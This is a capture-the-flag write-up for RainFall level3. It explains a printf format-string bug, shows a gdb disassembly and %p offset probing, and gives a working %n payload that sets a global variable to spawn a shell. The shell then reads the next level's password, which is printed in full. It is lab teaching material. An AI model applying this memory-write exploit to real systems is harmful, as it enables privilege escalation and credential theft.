Here, there is no buffer overflow, because `fgets` is protected against that. 
But, we can see in the source code that if the variable `m` is set to 0x40 (or 64), then the program will spawn us a shell.
With `gdb`,

```assembly
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.

```

We can see that the variable `m` corresponds to the address `0x804988c`. There is an exploit regarding `printf` that can make anyone write any value in a given address.
To do so, we first need to find how many bytes we need to skip to gather the given input, to be clear :

>level3@RainFall:~$ cat <(python -c 'print "AAAA " + "%p " * 10') - | ./level3 
>AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 

We can see here that the fourth `%p` send back to our own string `AAAA`. So, because of the `%n` option of printf, we can put 60 in the targeted address :

> level3@RainFall:~$ cat <(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"') - | ./level3 
> �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> Wait what?!
> cat /home/user/level4/.pass
> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

```bash
su level4
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

